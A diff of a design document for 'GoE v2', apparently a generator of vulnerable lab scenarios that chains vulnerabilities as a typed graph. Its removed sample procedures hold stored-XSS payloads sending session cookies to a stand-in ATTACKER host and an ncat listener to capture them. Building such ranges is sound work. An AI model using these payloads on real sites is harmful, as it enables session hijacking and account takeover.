@@ -1,119 +1,213 @@
-# GoE Rewrite [Entity Graph Model]
+# GoE v2 — Entity Graph Model
 
 GoE v2 represents scenarios as a directed graph of **entities** (exploitable vulnerabilities) connected by **typed edges** (attacker capabilities), deployed onto **systems** (infrastructure).
 
 ## Core Objects
 
 ### System
-Infrastructure that entities inhabit. Not exploitable — just deployment targets.
+
+Infrastructure that entities inhabit. Not exploitable — just a deployment target with an OS, services, and network identity.
+
 ```python
 @dataclass
 class System:
-	id: str
-	os: str                     # "ubuntu_22.04"
-	services: list[str]         # ["apache2", "mysql", "ssh"]
-	network: dict               # {"ip": "10.0.1.2", "ports": [22, 80, 3306]}
+    id: str                         # e.g. "webserver", "db_server"
+    os: str                         # "ubuntu_22.04"
+    services: list[str]             # ["apache2", "mysql", "ssh"]
+    network: NetworkConfig
+
+@dataclass
+class NetworkConfig:
+    hostname: str                   # Docker/compose hostname
+    exposed_ports: list[int]        # Ports reachable from operator
+    internal_ports: list[int]       # Ports reachable from other systems only
 ```
 
 ### Entity
-An exploitable vulnerability or misconfiguration. Described in natural language. Each entity declares what it requires (incoming edges) and what it provides (outgoing edges). The builder generates an implementation that satisfies these contracts, using atoms as reference if provided.
+
+An exploitable vulnerability or misconfiguration living on a system. Each entity declares typed contracts: what incoming edges it requires to be reachable, and what outgoing edges a successful exploit produces.
+
+An entity may produce **multiple outgoing edges** (fan-out). For example, a config file leak might provide both `creds_for(dbadmin, db_server)` and `creds_for(deploy, webserver)`.
+
 ```python
 @dataclass
 class Entity:
-	id: str
-	atoms: list[Atom]           # Atoms used to implement this entity (optional, for builder reference)
-	description: str            # Natural language: The LLM decides implementation, using atoms as reference if provided
-	system_id: str              # Which System this lives on
-	requires: list[Edge]        # Typed edges this entity needs to be reachable
-	provides: list[Edge]        # Typed edges a successful exploit produces
-	app_spec: AppSpec | None    # If set, builder generates a custom application
+    id: str                         # Unique, snake_case
+    description: str                # Natural language: what this vulnerability is
+    system_id: str                  # Which System this lives on
+    requires: list[Requirement]     # What must be true for this entity to be reachable
+    provides: list[str]             # Edge IDs this entity produces on successful exploit
+    app_spec: AppSpec | None        # If set, construction_crew generates a custom application
+    atoms: list[str]                # Atom IDs for builder reference (optional)
 ```
 
+### Requirement
+
+A requirement is a reference to an edge that must exist and target this entity. Requirements use **AND semantics** — all listed requirements must be satisfied for the entity to be reachable.
+
+```python
+@dataclass
+class Requirement:
+    edge_id: str                    # ID of an edge that must target this entity
+    optional: bool = False          # If true, entity is reachable without this (degrades capability)
+```
+
+**OR semantics (alternative paths)**: Modeled as separate entities with the same `provides` edges. If "get root via SUID" or "get root via cron hijack" are alternatives, create two entities that both provide `shell_as(root, host)`. The downstream entity requires that edge — either provider satisfies it. The builder builds both; the chain test uses whichever succeeds first.
+
 ### Edge
-Typed, parameterized contract between entities. Closed vocabulary, machine-verifiable.
+
+A typed, parameterized capability that an attacker gains. Edges are the fundamental unit of the graph — they connect entities and carry resolved values at runtime.
+
 ```python
 @dataclass
 class Edge:
-  from_entity: str            # Entity ID or "operator" for external attacker
-  to_entity: str              # Entity ID
-  type: str                   # Edge type from vocabulary (e.g. "network_reach", "shell_as")
+    id: str                         # Unique, snake_case (e.g. "webapp_to_admin_token")
+    from_entity: str                # Entity ID or "operator"
+    to_entity: str                  # Entity ID
+    type: EdgeType                  # From the closed vocabulary
+    params: dict[str, ParamValue]   # Type-specific parameters
+```
+
+### ParamValue
+
+Edge parameters have two resolution phases: structural (at plan time) and concrete (at build time). This separation is critical — see [Resolution Contract](#resolution-contract).
+
+```python
+@dataclass
+class ParamValue:
+    structural: str                 # What this param represents: "db_admin_password", "config_file_path"
+    concrete: str | None = None     # Actual value, filled by builder post-build: "hunter2", "/app/.env"
 ```
 
 ### Operator
-Special source node (external attacker). Entities whose *only* requirement is `network_reach` from operator are **initial access points**.
+
+Special source node representing the external attacker. Not an entity — it has no requirements and provides only `network_reach` edges to initial access points.
+
+Entities whose requirements consist solely of `network_reach` edges from operator are **initial access points**.
+
+---
 
 ## Edge Type Vocabulary
 
 | Type | Params | Meaning |
 |------|--------|---------|
-| `shell_as` | user, host | Interactive shell |
-| `creds_for` | user, host | Known username + password/key |
-| `db_session` | db_type, host | Authenticated DB connection |
-| `file_read` | path, host | Can read a file |
-| `file_write` | path, host | Can write a file |
-| `network_reach` | host, port | Can send packets to a service |
-| `code_exec` | context, host | RCE within a runtime |
-| `token_for` | service, host | Session cookie, JWT, API key |
+| `network_reach` | `host`, `port` | Can send packets to a service |
+| `shell_as` | `user`, `host` | Interactive shell as a specific user |
+| `creds_for` | `user`, `host`, `cred_type` | Known credentials (password, key, token) |
+| `db_session` | `db_type`, `host`, `user` | Authenticated database connection |
+| `file_read` | `path`, `host`, `as_user` | Can read a specific file |
+| `file_write` | `path`, `host`, `as_user` | Can write to a specific file/directory |
+| `code_exec` | `runtime`, `host`, `as_user` | Execute code within a runtime context |
+| `token_for` | `service`, `host`, `scope` | Session cookie, JWT, API key |
 
-Routing params (host, user, port) are exact identifiers. Content params (path, context) are descriptive — resolved at build time.
+### Param Definitions
+
+- `host`: System hostname (must match a `system.network.hostname`)
+- `port`: Integer, must be in system's `exposed_ports` or `internal_ports`
+- `user`: Unix username or application-level username
+- `cred_type`: One of `password`, `ssh_key`, `api_key`
+- `as_user`: The identity executing the action (encodes privilege level)
+- `db_type`: One of `mysql`, `postgresql`, `mongodb`, `redis`
+- `runtime`: One of `python`, `node`, `php`, `bash`
+- `service`: Application identifier (e.g. `admin_panel`, `api`)
+- `scope`: Permission scope of the token (e.g. `admin`, `read_only`)
+- `path`: Filesystem path — structural value is descriptive ("app config file"), concrete value is the actual path (`/app/.env`)
+
+### Identity via `as_user`
+
+Rather than a separate identity node layer, identity is encoded as a param on edges that involve executing actions. The `as_user` param on `file_read`, `file_write`, and `code_exec` distinguishes "www-data reads /etc/shadow" (fails) from "root reads /etc/shadow" (succeeds). Shell upgrades are modeled as a chain: `shell_as(www-data, host)` → privesc entity → `shell_as(root, host)`.
+
+### Modeling Non-Obvious Scenarios
+
+**SSRF**: The application makes the request, not the operator. Model as an entity that requires `network_reach(host, 80)` from operator and provides `network_reach(internal_host, internal_port)` — the outgoing edge's implicit identity is the application itself (encoded in the entity description, not the edge type).
+
+**Information disclosure**: Model as a pass-through entity. Requires `network_reach`, provides `creds_for` or `file_read` depending on what's leaked. Enumeration/recon that doesn't directly yield a typed capability is modeled as part of a larger entity's internal procedure (e.g., "enumerate users then brute-force" is one entity that provides `creds_for`).
+
+**Ephemeral/conditional access**: Model as a normal entity with a note in the description. The builder handles timing constraints in the implementation (e.g., race condition exploit in the procedure). The graph doesn't model time — it models reachability.
+
+---
+
+## Resolution Contract
+
+Edge params are resolved in two phases:
+
+### Phase 1: Structural Resolution (Plan Time)
+
+During the `resolve` step, params get **structural identifiers** — human-readable names that describe *what* the value represents without committing to a specific value.
+
+```yaml
+edge: webapp_to_config_read
+params:
+  path: { structural: "app_config_file", concrete: null }
+  host: { structural: "webserver", concrete: "webserver" }  # hostnames are known at plan time
+  as_user: { structural: "webapp_service_user", concrete: null }
+```
+
+Static validation operates on structural values: "does every requirement have a provider with matching edge type and structural param compatibility?"
+
+### Phase 2: Concrete Resolution (Build Time)
+
+After each builder completes, it **reports back** the concrete values it used:
+
+```yaml
+edge: webapp_to_config_read
+params:
+  path: { structural: "app_config_file", concrete: "/app/.env" }
+  host: { structural: "webserver", concrete: "webserver" }
+  as_user: { structural: "webapp_service_user", concrete: "www-data" }
+```
+
+Downstream builders receive these concrete values as input. This means:
+- Builders have full design freedom (put the config file wherever makes sense)
+- Downstream entities use the *actual* values (no guessing)
+- Build order matters: a consuming entity cannot start until its providing entity has finished and reported values
+
+### What This Means for Build Ordering
+
+Topological sort already enforces "provider builds before consumer." The resolution contract adds: **after provider builds, propagate its concrete values to all consuming entities before they start.**
+
+```
+Entity A builds → reports concrete values → 
+    values propagated to Edge(A→B).params → 
+        Entity B receives concrete values as input → Entity B builds
+```
+
+---
 
 ## Custom Apps
 
 Entities that need a generated custom application carry an `app_spec`:
+
 ```python
 @dataclass
 class AppSpec:
-    runtime: str                # "express", "flask", "apache_php"
-    atoms: list[Atom]            # Atom IDs used in this app (optional, for builder reference)
-    vulnerabilities: list[str]  # Vulnerabilities (xss_stored) OR misconfigurations (csp_misconfig)
-    goal: str                   # Natural language: what the exploit achives
+    runtime: str                    # "express" | "flask" | "apache_php"
+    vulnerabilities: list[str]      # Vuln atom IDs or descriptions
+    goal: str                       # What successful exploitation achieves (maps to provides edges)
 ```
 
-## Procedure (Builder Output)
+The construction_crew receives the `app_spec` plus all resolved incoming edge values and generates:
+- Application source file(s)
+- Attack procedure (see Procedure DSL)
+- Concrete param values for all outgoing edges
 
-The builder generates the app **and** a concrete attack procedure specific to what it built. Procedures are dynamic per-entity, not templated. This is critical for custom apps where endpoints and payloads vary.
+---
 
-```yaml
-procedure:
-  - step: inject
-    method: "POST /api/reviews"
-    body: {"text": "<script>fetch('http://ATTACKER:9999?c='+document.cookie)</script>"}
-  - step: trigger
-    method: browser
-    url: "http://target:3000/product/1"
-    actor: admin_bot
-  - step: receive
-    method: listen
-    port: 9999
-    expect: "session_id=..."
-  - step: verify
-    method: "GET /admin/dashboard"
-    headers: {"Cookie": "session_id=..."}
-    expect_status: 200
-```
+## Static Validation (Pre-Build)
 
-The procedure is dynamic and per-entity — not templated. This is critical for custom apps where the builder decides endpoints, payloads, and flow. The test agent receives this procedure and executes it literally.
+Runs in milliseconds after the graph is planned. Checks:
 
-## Graph Relationships
+1. **Edge coverage**: Every entity's `requires` list references an edge that has `to_entity` matching this entity
+2. **Type compatibility**: The edge type's params are structurally compatible with what consumer expects
+3. **Reachability**: Every entity is reachable from operator via a path of edges (no orphans)
+4. **Fan-out consistency**: If multiple entities require the same edge, the providing entity's builder must produce values usable by all consumers
+5. **System reference validity**: Every `entity.system_id` and every `host` param references an existing system
+6. **No cycles**: The entity dependency graph is a DAG (edges form a topological order)
+7. **Initial access exists**: At least one entity requires only `network_reach` from operator
 
-- Inter-system edges = attacker moves between hosts. Each side is a separate entity with matching edge types.
-- Intra-app complexity (e.g., multi-step XSS) = one entity with an internal procedure. The graph only sees inputs and outputs — the steps happen inside one builder's scope.
+Validation operates on **structural** param values only. It cannot verify that concrete values will be correct — that's the builder's job and the test's verification.
 
-## Atoms
-
-Atoms are **reference material for builders**, not orchestration units. Builders read atoms to understand techniques. Atoms improve quality but aren't required. The LLM can generate without one for novel scenarios.
-
-## Static Validation
-
-Typed edges allow chain validation before building: verify every entity's `requires` is satisfied by an incoming edge. Catches broken chains in milliseconds.
-
-## Build Flow
-
-1. **Planner** user request -> typed entity graph
-2. **Static validation**: verify edge type matching
-3. **Builders** (per entity, parallelizable): entity + atoms -> app code + procedure + deploy script
-4. **Test agents** (per entity): execute procedure, report pass/fail
-5. **Chain test** (if multi-system): deploy full topology, walk edges end-to-end
+---
 
 ## Example
 
@@ -122,41 +216,100 @@ systems:
   - id: webserver
     os: ubuntu_22.04
     services: [nginx, node, mysql]
+    network:
+      hostname: webserver
+      exposed_ports: [80]
+      internal_ports: [3306]
+
   - id: db_server
     os: ubuntu_22.04
     services: [ssh, postgresql]
+    network:
+      hostname: db_server
+      exposed_ports: []
+      internal_ports: [22, 5432]
 
 entities:
   - id: vuln_webapp
-    description: "E-commerce app with stored XSS in product reviews"
+    description: "E-commerce app with stored XSS in product reviews that steals admin session cookies via an admin bot"
     system_id: webserver
-    requires: [network_reach(webserver, 80)]
-    provides: [token_for(admin, webserver)]
-    app_spec: { runtime: express, vulnerabilities: [xss_stored], goal: "steal admin session cookie" }
+    requires:
+      - edge_id: operator_to_webapp
+    provides: [webapp_to_admin_token]
+    app_spec:
+      runtime: express
+      vulnerabilities: [xss_stored]
+      goal: "steal admin session cookie via stored XSS triggering on admin bot visit"
 
   - id: admin_panel_rce
-    description: "Admin panel file upload allows arbitrary PHP execution"
+    description: "Admin panel with unrestricted file upload allowing PHP webshell execution"
     system_id: webserver
-    requires: [token_for(admin, webserver)]
-    provides: [shell_as(www-data, webserver)]
+    requires:
+      - edge_id: webapp_to_admin_token
+    provides: [admin_rce_to_shell]
+    app_spec:
+      runtime: apache_php
+      vulnerabilities: [file_upload_bypass]
+      goal: "upload and execute a webshell to gain code execution as www-data"
 
   - id: db_creds_in_config
-    description: "DB credentials in plaintext config readable by www-data"
+    description: "Database credentials stored in plaintext config file readable by www-data"
     system_id: webserver
-    requires: [shell_as(www-data, webserver)]
-    provides: [creds_for(dbadmin, db_server)]
+    requires:
+      - edge_id: admin_rce_to_shell
+    provides: [config_to_db_creds]
+    atoms: [exposed_env_vars]
 
-  - id: ssh_to_db
-    description: "PostgreSQL admin reuses password for SSH"
+  - id: ssh_reuse
+    description: "PostgreSQL admin reuses the same password for SSH access"
     system_id: db_server
-    requires: [creds_for(dbadmin, db_server)]
-    provides: [shell_as(dbadmin, db_server)]
+    requires:
+      - edge_id: config_to_db_creds
+    provides: [db_creds_to_ssh]
+    atoms: [weak_service_password]
 
 edges:
-  - { from: operator, to: vuln_webapp, type: network_reach, params: {host: webserver, port: 80} }
-  - { from: vuln_webapp, to: admin_panel_rce, type: token_for, params: {service: admin, host: webserver} }
-  - { from: admin_panel_rce, to: db_creds_in_config, type: shell_as, params: {user: www-data, host: webserver} }
-  - { from: db_creds_in_config, to: ssh_to_db, type: creds_for, params: {user: dbadmin, host: db_server} }
+  - id: operator_to_webapp
+    from_entity: operator
+    to_entity: vuln_webapp
+    type: network_reach
+    params:
+      host: { structural: webserver, concrete: webserver }
+      port: { structural: http_port, concrete: 80 }
+
+  - id: webapp_to_admin_token
+    from_entity: vuln_webapp
+    to_entity: admin_panel_rce
+    type: token_for
+    params:
+      service: { structural: admin_panel, concrete: null }
+      host: { structural: webserver, concrete: webserver }
+      scope: { structural: admin, concrete: null }
+
+  - id: admin_rce_to_shell
+    from_entity: admin_panel_rce
+    to_entity: db_creds_in_config
+    type: shell_as
+    params:
+      user: { structural: webapp_service_user, concrete: null }
+      host: { structural: webserver, concrete: webserver }
+
+  - id: config_to_db_creds
+    from_entity: db_creds_in_config
+    to_entity: ssh_reuse
+    type: creds_for
+    params:
+      user: { structural: db_admin_user, concrete: null }
+      host: { structural: db_server, concrete: db_server }
+      cred_type: { structural: password, concrete: password }
+
+  - id: db_creds_to_ssh
+    from_entity: ssh_reuse
+    to_entity: null  # terminal edge — final objective
+    type: shell_as
+    params:
+      user: { structural: db_admin_user, concrete: null }
+      host: { structural: db_server, concrete: db_server }
 ```
 
 ### Graph Visualization
@@ -165,71 +318,28 @@ edges:
                          [webserver]                              [db_server]
                  ┌────────────────────────────────┐          ┌─────────────────┐
                  │                                │          │                 │
- ┌──────────┐    │  ┌─────────────┐   token_for   │          │                 │
- │ OPERATOR │────┼─>│ vuln_webapp │────────────┐  │          │                 │
- └──────────┘    │  └─────────────┘            │  │          │                 │
-  network_reach  │                             v  │          │                 │
-  :80            │              ┌────────────────┐|          │                 │
-                 │              │admin_panel_rce ││          │                 │
-                 │              └────────────────┘|          │                 │
-                 │                    │ shell_as  |          │                 │
-                 │                    v (www-data)|          │                 │
-                 │              ┌────────────────┐|          │                 │
-                 │              │db_creds_in_conf││          │                 │
-                 │              └────────────────┘|          │                 │
-                 │                    │           │          │                 │
-                 └────────────────────┼───────────┘          │                 │
-                                      │ creds_for            │  ┌───────────┐  │
-                                      │ (dbadmin)            │  │ ssh_to_db │  │
-                                      └──────────────────────┼─>│           │  │
-                                                             │  └───────────┘  │
-                                                             │   provides:     │
-                                                             │   shell_as      │
-                                                             │   (dbadmin)     │
+ ┌──────────┐    │  ┌─────────────┐               │          │                 │
+ │ OPERATOR │────┼─>│ vuln_webapp │               │          │                 │
+ └──────────┘    │  └──────┬──────┘               │          │                 │
+  network_reach  │         │ token_for            │          │                 │
+  :80            │         v                      │          │                 │
+                 │  ┌────────────────┐            │          │                 │
+                 │  │admin_panel_rce │            │          │                 │
+                 │  └───────┬────────┘            │          │                 │
+                 │          │ shell_as(www-data)  │          │                 │
+                 │          v                     │          │                 │
+                 │  ┌────────────────┐            │          │                 │
+                 │  │db_creds_in_conf│            │          │                 │
+                 │  └───────┬────────┘            │          │                 │
+                 │          │                     │          │                 │
+                 └──────────┼─────────────────────┘          │                 │
+                            │ creds_for(dbadmin)             │  ┌───────────┐  │
+                            └────────────────────────────────┼─>│ ssh_reuse │  │
+                                                             │  └─────┬─────┘  │
+                                                             │        │        │
+                                                             │        v        │
+                                                             │  shell_as       │
+                                                             │  (dbadmin)      │
+                                                             │  [OBJECTIVE]    │
                                                              └─────────────────┘
-```
-
-### Sample Procedure (vuln_webapp builder output)
-
-The builder for `vuln_webapp` generates the Express app and produces this concrete procedure for the test agent:
-
-```yaml
-app_source: app.js
-procedure:
-  - step: setup_listener
-    actor: attacker
-    method: "ncat -lk 9999 > /tmp/stolen_cookies &"
-    context: attacker_shell
-
-  - step: inject_payload
-    actor: attacker
-    method: "POST http://webserver:3000/api/reviews"
-    headers: {"Content-Type": "application/json"}
-    body: |
-      {
-        "product_id": 1,
-        "rating": 5,
-        "text": "<img src=x onerror=\"fetch('http://ATTACKER:9999/steal?c='+document.cookie)\">"
-      }
-    expect_status: 201
-
-  - step: trigger_admin_bot
-    actor: admin_bot
-    method: browser
-    url: "http://webserver:3000/products/1"
-    wait: 3000
-    note: "Admin bot visits product page, renders stored review, XSS fires in admin session"
-
-  - step: capture_cookie
-    actor: attacker
-    method: "cat /tmp/stolen_cookies"
-    context: attacker_shell
-    expect_contains: "session_id="
-
-  - step: verify_session_theft
-    actor: attacker
-    method: "GET http://webserver:3000/admin/dashboard"
-    headers: {"Cookie": "${captured_session_id}"}
-    expect_status: 200
-    expect_body_contains: "Admin Dashboard"
 ```
